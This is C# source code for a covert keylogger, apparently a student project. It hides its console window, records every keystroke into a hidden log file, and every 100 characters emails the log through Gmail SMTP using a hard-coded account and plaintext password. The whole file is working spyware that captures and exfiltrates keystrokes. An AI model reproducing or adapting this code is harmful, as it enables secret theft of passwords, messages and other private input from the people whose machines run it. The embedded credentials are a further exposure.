using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace dotnet_kl
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(Int32 i);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        
        
        static long numberOfCharacters = 0;

        static void Main(string[] args)
        {
            //Hide console
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            String folderpath = "W:\\cs nganh mang\\dotnet kl";

            if (!Directory.Exists(folderpath))
            {
                Directory.CreateDirectory(folderpath);
            }

            String path = (folderpath + @"\keylog.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
                //Hide log file
                File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
            }

            while (true)
            {
                //pause and let other programs get a chance to run
                Thread.Sleep(25);

                //check all keys for their state
                for (short i = 32; i <= 127; i++)
                {
                    short keyState = GetAsyncKeyState(i);
                    if (keyState == -32767)
                    {
                        Console.Write((char) i + ", ");

                        using (StreamWriter sw =File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                        numberOfCharacters++;

                        // send a email after logged 20 characters
                        if (numberOfCharacters % 100 == 0)
                        {
                            SendNewMail();
                        }
                    }
                    
                    
                }
            }
        }//main
        
        static void SendNewMail()
        {
            String folderpath = "W:\\cs nganh mang\\dotnet kl";
            String filepath = (folderpath + @"\keylog.txt");

            String logContents = File.ReadAllText(filepath);
            string emailbody = "";

            //create an email message
            DateTime now = DateTime.Now;
            string subject = "keylog";

            emailbody += "\nTime:" + now.ToString();
            emailbody += "\n" + logContents;
            
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("keylogger223344@gmail.com");
            mailMessage.To.Add("keylogger223344@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("keylogger223344@gmail.com", "qwer1234!@#$");
            mailMessage.Body = emailbody;
            
            client.Send(mailMessage);
        }
        
    }
}
